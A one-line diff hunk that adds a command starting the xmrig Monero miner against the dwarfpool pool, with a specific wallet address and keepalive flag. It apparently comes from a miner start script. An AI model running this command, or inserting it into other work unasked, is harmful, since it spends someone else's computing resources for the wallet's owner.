@@ -1,0 +1,1 @@
+xmrig.exe --donate-level=1 -o xmr-eu.dwarfpool.com:8005 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS3KzARPjr4uEYEvhoi -p x -k
